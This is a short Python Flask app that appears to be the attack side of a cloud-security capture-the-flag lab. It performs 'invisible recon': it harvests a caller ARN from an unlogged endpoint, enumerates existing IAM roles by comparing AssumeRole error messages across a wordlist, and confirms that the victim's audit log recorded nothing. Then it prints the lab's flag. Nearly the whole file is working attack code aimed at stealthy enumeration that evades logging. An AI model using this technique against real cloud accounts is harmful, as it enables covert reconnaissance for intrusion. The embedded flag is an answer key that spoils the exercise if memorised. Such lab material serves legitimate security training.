"""IAM enumeration 2.0: unlogged error oracle + AssumeRole differential."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
API = os.environ.get("API_URL", "http://control-api:5000")
STS = os.environ.get("STS_URL", "http://sts:5000")
AUDIT = os.environ.get("AUDIT_URL", "http://audit-log:5000")
FLAG = os.environ.get("FLAG", "flag{cloud-34-zero-audit-enum}")

HTML = """<h1>IAM Enumeration 2.0</h1>
<form method="post" action="/run"><button>Run invisible recon</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    # 1. unlogged endpoint leaks the caller ARN
    r = requests.get(f"{API}/api/unsupported", headers={"X-Caller-ARN": "arn:aws:iam::111122223333:user/attacker/leaked-key"}, timeout=8)
    log.append(f"[1] unsupported API AccessDenied: {r.json()['message']}")

    # 2. AssumeRole wordlist differential
    wordlist = ["AdminRole", "SecretRole", "DataPipelineRole", "NonexistentRole", "BackupRole"]
    hits = []
    for name in wordlist:
        rr = requests.post(f"{STS}/assume-role", json={"role_name": name}, timeout=8)
        msg = rr.json().get("message", "")
        if "resource: arn:aws:iam::444455556666:role/" in msg:
            hits.append(name)
    log.append(f"[2] AssumeRole differential found existing roles: {hits}")

    # 3. confirm the audit log has zero entries
    logs = requests.get(f"{AUDIT}/logs", timeout=8).json()
    log.append(f"[3] victim audit log entries: {logs['count']} (all recon was invisible)")
    log.append(f"FLAG: {FLAG}")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
